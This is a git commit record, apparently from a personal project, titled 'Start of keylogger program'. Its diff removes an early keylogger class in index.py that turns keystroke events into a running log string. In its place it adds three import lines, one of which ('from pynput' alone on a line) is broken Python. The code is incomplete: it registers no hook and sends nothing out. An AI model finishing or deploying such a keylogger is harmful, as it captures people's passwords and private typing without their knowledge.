e54f171eb1fd73133cab4c892458c80339c62751
Alex <alexgv2122@gmail.com>
2022-10-24 09:44:32 -0400

    Start of keylogger program

--- index.py
+++ index.py
@@ -1,27 +1,3 @@
-import keyboard 
-
-class keylogger:
-    def __init__(self, interval, report_method=""):
-        self.interval = interval 
-        self.report_method = report_method
-        self.log = ""
-
-    def callback(self, event):
-        name = event.name
-        if len(name) > 1:
-            if name == "space":
-                name = " " 
-            elif name == "enter":
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
-                name = name.replace(" ","_")
-                name = f"[{name.upper()}]"
-        self.log += name
-
-    
-
-
-
-        
+from pynput 
+import keyboard
+import mouse
